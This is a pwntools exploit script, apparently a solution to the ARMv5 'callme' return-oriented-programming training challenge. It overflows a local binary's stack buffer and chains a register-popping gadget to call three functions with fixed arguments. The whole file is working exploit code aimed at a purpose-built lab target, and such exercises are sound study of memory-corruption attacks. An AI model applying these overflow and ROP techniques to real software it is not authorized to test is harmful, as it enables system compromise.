from pwn import *

pop_r0_r1_r2_lr_pc = 0x00010870
callme_one = 0x00010624
callme_two = 0x00010678
callme_three = 0x00010618
p = process('./callme_armv5-hf')

p.recvuntil('> ')

buf = b'A' * 0x24
buf += p32(pop_r0_r1_r2_lr_pc)
buf += p32(0xdeadbeef) # r0
buf += p32(0xcafebabe) # r1
buf += p32(0xd00df00d) # r2
buf += p32(pop_r0_r1_r2_lr_pc) # lr
buf += p32(callme_one) # pc

buf += p32(0xdeadbeef) # r0
buf += p32(0xcafebabe) # r1
buf += p32(0xd00df00d) # r2
buf += p32(pop_r0_r1_r2_lr_pc) # lr
buf += p32(callme_two) # pc

buf += p32(0xdeadbeef) # r0
buf += p32(0xcafebabe) # r1
buf += p32(0xd00df00d) # r2
buf += p32(0xAA) # lr
buf += p32(callme_three) # pc

p.send(buf)
p.interactive()
